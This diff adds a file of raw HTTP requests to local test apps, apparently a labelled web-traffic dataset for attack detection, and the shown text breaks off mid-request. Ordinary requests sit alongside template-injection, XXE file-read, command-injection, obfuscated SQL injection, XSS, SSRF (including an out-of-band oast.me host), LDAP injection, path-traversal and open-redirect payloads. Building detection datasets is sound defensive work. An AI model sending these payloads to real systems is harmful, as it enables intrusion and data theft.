@@ -1,0 +1,1062 @@
+"GET /vulnerabilities/sqli/?id=${1+2}|e HTTP/1.1
+User-Agent: Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=1A5B78090C7FB50FD7F76C8A3C841AE3
+Host: localhost
+Connection: close"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=7BAC5CEC38CB255AFB4C10DA86121AA4
+Host: localhost
+Content-Type: application/xml
+Connection: close
+Content-Length: 96
+
+<?xml version=""1.0"" encoding=""UTF-8""?>
+<user>
+    <id>x-from</id>
+    <name>admin</name>
+</user>"
+"GET /?mou=5647 HTTP/1.1
+Host: localhost:3000
+User-Agent: PostmanRuntime/7.26.8
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 20535874-f7b3-428d-bebb-eed684c6db26
+
+"
+"GET /vulnerabilities/sqli/?id=1&nad=0207 HTTP/1.1
+User-Agent: <div style=""position:fixed;top:0;left:0;width:100%;height:100%;background:linear-gradient(45deg,red,black);color:lime;font-size:100px;display:flex;align-items:center;justify-content:center;z-index:999999;"">PWNED</div>
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=2A5F5EB03771E7C8AE019CFBCA162998
+Host: localhost
+Connection: close
+
+"
+"GET /vulnerabilities/sqli/?id=1&elc=3121 HTTP/1.1
+User-Agent: ${eval(`{php}echo `id`;{/php}`)}
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=910217416037255B4C4668C3CF07CE2A
+Host: localhost
+Connection: close
+
+"
+"GET /?lyo=1339 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: a267691f-bd04-4723-ac6a-25a07c1a2bd9
+
+"
+"GET /?qrg=6622&path=/usr/local/bin HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: c304edf9-c16a-4d9d-a7c7-2461319d8c6e
+
+"
+"GET /?mqy=6322 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 06cf2333-5b9b-4903-8ed0-42529508888c
+
+&extra_info=text=../../etc/passwd"
+"GET /vulnerabilities/sqli/?id=file://localhost:3306/ HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:121.0) Gecko/20100101 Firefox/121.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=932759E9E231D0B9F0FF092FE552C1FB
+Host: localhost
+Connection: close"
+"GET /realms/master/protocol/openid-connect/auth?client_id=account&redirect_uri=https://127.0.0.1:80@oast.me HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (ZZ; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
+Accept-Encoding: gzip
+Connection: close"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=1A149FACAE9E7D32DE2CA4286C73E48E
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 49
+
+id=http%3A//%40%5B%3A%3A1%5D%3A9001&submit=Submit"
+"GET /vulnerabilities/sqli/?id=1&ccr=6299 HTTP/1.1
+User-Agent: //%09evil.com
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=56C07738D0F9A751314B342B16D8E375
+Host: localhost
+Connection: close
+
+"
+"GET /?ref=85f8df27-0105-4c59-8b19-5286150be000&session_token=7256 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 85f8df27-0105-4c59-8b19-5286150be000
+
+value=alert(1)"
+"GET /?vun=8595&query=drop+table HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: c8be017b-7086-4e71-bdf5-bee32311e951
+
+"
+"GET /?tde=3750 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 589b0cfe-3d93-41a8-85a6-1896e4feb986
+
+"
+"POST /api/v1/session HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Connection: close
+Content-Length: 52
+Content-Type: application/json
+Accept-Encoding: gzip
+
+{""username"":""admin"",""password"":""admin321"",""code"":""""}"
+"GET /?tsw=4842 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 6b33e191-797e-44c7-a79d-56f930a86edf
+
+"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=BEE17435ADCBDBE5D2C6C8A81DB4D984
+Host: localhost
+Content-Type: application/xml
+Connection: close
+Content-Length: 207
+
+<?xml version=""1.0"" encoding=""UTF-8""?>
+<user>
+    <id><!DOCTYPE payload [<!ENTITY payload php://filter/convert.base64-encode/resource=""C:/Windows/Panther/Unattend.xml""> ]></id>
+    <name>admin</name>
+</user>"
+"GET /rest/products/search?q=apple&cache_id=708992b6-67e4-4cea-b092-a6ddb165b720&desc=admin's+profile HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 708992b6-67e4-4cea-b092-a6ddb165b720"
+"GET /rest/products/search?q=juice&cache_id=1527b2c0-14a2-4e3e-9d57-aab512b73e74 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 1527b2c0-14a2-4e3e-9d57-aab512b73e74"
+"GET /rest/products/search?q=shirt&cache_id=c544042e-2379-4cd0-9be6-7b5b680fcfe3 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: c544042e-2379-4cd0-9be6-7b5b680fcfe3"
+"GET /?hio=6459 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: f34503d3-41ae-4d7e-bf3e-f733e1a6d6e2
+
+&extra_info=query=drop+table"
+"GET /?csy=3408 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 8c0556dd-6830-4b2c-ac97-603cae3b25bd
+
+&extra_info=data=%3Cscript%3E"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=10FBAEA8A6347F0492D00290DDCF167D
+Host: localhost
+Content-Type: application/xml
+Connection: close
+Content-Length: 119
+
+<?xml version=""1.0"" encoding=""UTF-8""?>
+<user>
+    <id>https://;127.127.127.127:5000</id>
+    <name>admin</name>
+</user>"
+"GET /rest/products/search?q=shirt&cache_id=f3acb125-5465-4e02-abba-9aac68bd0053 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: f3acb125-5465-4e02-abba-9aac68bd0053
+
+q=select+*+from+users"
+"GET /vulnerabilities/sqli/?id=${&rpo=3182 config.items()[4][1].__class__.__mro__[2].__subclasses__()[40]('id').read() }} HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=78A1A21825992C2E74129C3470855B46
+Host: localhost
+Connection: close
+
+"
+"GET /?kvu=9310&cmd=ping+127.0.0.1 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 2560acbf-ee8d-4fac-9fec-80957afb6dc6
+
+"
+"GET /?apc=0227 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/100.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 573d854f-0e7a-441c-b552-717a8f1c77e6
+
+&extra_info=path=/usr/local/bin"
+"GET /?idn=9386 HTTP/1.1
+Host: localhost:3000
+User-Agent: PostmanRuntime/7.26.8
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 08bf0e79-20e6-4f36-83ea-9330aae8b13b
+
+"
+"GET /?rwn=9561&desc=admin's+profile HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 706e2a2d-edb7-4cb4-8540-47a8d726bfe3
+
+"
+"GET /rest/products/search?q=%20%0aYUI=%24%28echo%20JGJRTX%29%0aYUI1=%24%7B%23YUI%7D%0aif%20%5B%203%20-eq%20%24YUI1%20%5D%0athen%20sleep%201%0afi%27 HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: commix/v4.2.dev1 (https://commixproject.com)
+Referer: http://localhost:3000/rest/products/search
+Host: localhost:3000
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close"
+"GET /?nbt=7289 HTTP/1.1
+Host: localhost:3000
+User-Agent: curl/7.68.0
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 3c81fb43-facb-43f7-9f96-7fd0f8bd665f
+
+"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=AA5B6A4D985703786E68804C309F01F6
+Host: localhost
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+Content-Length: 325
+
+id=%3Cimg%20src%3D%22/transfer%40%3F%3Cinput%20type%3D%22hidden%22%20name%3D%22recipient%22%20value%3D%22password123%20%22%3E%3Cinput%20type%3D%22hidden%22%20name%3D%22amount%22%20value%3D%22root%22%3E%3Cinput%20type%3D%22hidden%22%20name%3D%22destination%22%20value%3D%22admin%40evil.comvbscript%3A%22%3E%22%3E&submit=Submit"
+"GET /vulnerabilities/sqli/?id=1&bxx=9304 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=B1C0EE30C1EC3347429EB0A73ABBE60D
+Referer: http://malicious.com/'""<noscript src=x onmousemove=alert%281%29>""'
+Host: localhost
+Connection: close
+
+"
+"GET /?huu=1996 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: f7e47bcb-e6f8-45ba-a5b4-a4eb9e59c881
+
+"
+"GET /?rkz=1189&id=1 OR 1=1 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: db4bed7d-999d-4419-83e5-1ec2372febe5
+
+"
+"GET /rest/products/search?q=glass&cache_id=a55ea436-7890-40f9-ac16-3e62dfc426ed HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: a55ea436-7890-40f9-ac16-3e62dfc426ed"
+"GET /?qfd=9290 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 538666c6-3af9-47fd-871f-f55e9f5fc7c6
+
+"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=97E2A8345198495586278A4900CB0E6F
+Host: localhost
+Content-Type: application/json
+Connection: close
+Content-Length: 38
+
+{""id"": ""**))|(*)"", ""action"": ""search""}"
+"GET /vulnerabilities/sqli/?id=1&bal=5012 HTTP/1.1
+User-Agent: *)&(%29
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=DE5C293B14CEF6F553F10822534D316B
+Host: localhost
+Connection: close
+
+"
+"GET /rest/products/search?q=%28%2F%2A%21%53%45%6C%45%43%74%2A%2F%28%2F%2A%21%63%61%73%45%2A%2F%2F%2A%21%77%68%45%4E%2A%2F%28%36%38%34%31%3D%38%33%30%36%29%2F%2A%21%54%68%45%6E%2A%2F%36%38%34%31%2F%2A%21%45%4C%53%65%2A%2F%43%61%53%74%28%31%2F%2A%21%41%73%2A%2F%2F%2A%21%69%4E%54%2A%2F%29%2F%28%2F%2A%21%53%45%6C%45%43%74%2A%2F%30%2F%2A%21%66%72%4F%6D%2A%2F%2F%2A%21%44%55%41%6C%2A%2F%29%2F%2A%21%65%4E%44%2A%2F%29%2F%2A%21%66%72%4F%6D%2A%2F%2F%2A%21%44%55%41%6C%2A%2F%29 HTTP/1.1
+Cache-Control: no-cache
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36 Edg/138.0.0.0
+Referer: http://localhost:3000/rest/products/search
+Host: localhost:3000
+Accept: */*
+Accept-Encoding: gzip,deflate
+Connection: close"
+"POST /v1/graphql/console?amr=2834 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:59.0) Gecko/20100101 Firefox/59.0
+Content-Length: 67
+Accept: */*
+Accept-Language: en
+Content-Type: application/json
+Accept-Encoding: gzip
+Connection: close
+
+{""query"":""query IntrospectionQuery{__schema {queryType { name }}}""}"
+"GET /rest/products/search?q=premium&cache_id=8ea14582-a95e-48ee-8f89-91c1da8d017d&file=../../images/logo.png HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 8ea14582-a95e-48ee-8f89-91c1da8d017d"
+"GET /rest/products/search?q=sale&cache_id=7aa4fdf1-88c5-4484-86d5-603a33c2e473 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 7aa4fdf1-88c5-4484-86d5-603a33c2e473"
+"GET /?wig=1445 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 18ef4128-8307-4af0-b46a-948abbe8b9bb
+
+"
+"GET /vulnerabilities/sqli/?id=1&mrk=6715 HTTP/1.1
+User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Safari/605.1.15
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=C77EE404D745FC8FBC6F7C32D1AFB740
+Referer: http://malicious.com/""<script>parent.alert%281%29</script>""
+Host: localhost
+Connection: close
+
+"
+"GET /rest/products/search?q=<h6>your site has been compromised HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=8ED1804FA4E6A818A0743CB3946424C2
+Host: localhost:3000
+Connection: close"
+"POST /vulnerabilities/sqli/ HTTP/1.1
+User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=F885AA397E19721A3BBD2E173C3685A0
+Host: localhost
+Content-Type: application/xml
+Connection: close
+Content-Length: 196
+
+<?xml version=""1.0"" encoding=""UTF-8""?>
+<user>
+    <id><meta http-equiv=""refresh"" content=""0;url=/payment/submit?<input type=""hidden"" name=""currency"" value=""root</id>
+    <name>admin</name>
+</user>"
+"GET /?ddo=6602 HTTP/1.1
+Host: localhost:3000
+User-Agent: curl/7.68.0
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 5ab9f7e4-708b-420a-89e6-5fff2ad71a14
+
+"
+"GET /?bsm=3693 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 98e74f45-f618-4a39-8c6a-89d83a537e89
+
+"
+"GET /rest/products/search?q=%20%7Cecho%20WKIFUF%24%28%2814%2B67%29%29%24%28echo%20WKIFUF%29WKIFUF%3B HTTP/1.1
+Content-Type: application/x-www-form-urlencoded
+User-Agent: commix/v4.2.dev1 (https://commixproject.com)
+Referer: http://localhost:3000/rest/products/search
+Host: localhost:3000
+Accept: */*
+Accept-Encoding: gzip, deflate
+Connection: close"
+"GET /?lgq=7662&math=1<2 HTTP/1.1
+Host: localhost:3000
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
+Accept-Encoding: gzip, deflate, br
+Accept: */*
+Connection: keep-alive
+X-Request-ID: 6353e90b-7082-44ef-9cff-1f2daabd6870
+
+"
+"GET /vulnerabilities/sqli/?id=ldap://127.1 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=7E7FA62DC0CC1A39C9626BDE9DAB66C4
+Host: localhost
+Connection: close"
+"GET /vulnerabilities/sqli/?id=1&yoq=6144 HTTP/1.1
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=1CC9302D679E81D7DB3C0782F2696452
+Referer: http://malicious.com//../evil.com
+Host: localhost
+Connection: close
+
+"
+"GET /vulnerabilities/sqli/?id=<bIg>sEcUrItY ReSeArCh dEmO HTTP/1.1
+User-Agent: Mozilla/5.0 (iPad; CPU OS 17_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.1 Mobile/15E148 Safari/604.1
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=BB4BBA36F097C009316FE55EAD17C7C0
+Host: localhost
+Connection: close"
+"GET /rest/products/search?q=gopher://127.0.0.1:8080 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0
+Pragma: no-cache
+Cache-Control: no-cache
+Accept: text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5
+Accept-Encoding: x-gzip, x-deflate, gzip, deflate
+Accept-Charset: utf-8, utf-8;q=0.5, *;q=0.5
+Accept-Language: en
+Cookie: JSESSIONID=C2A57BFBC29D6CCAE8A0CBA8750BBEA3
+Host: localhost:3000
+Connection: close"
+"GET /vulnerabilities/sqli/?id=1&eaw=5648 HTTP/1.1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
+Pragma: no-cache
+Cache-Control: no-cache
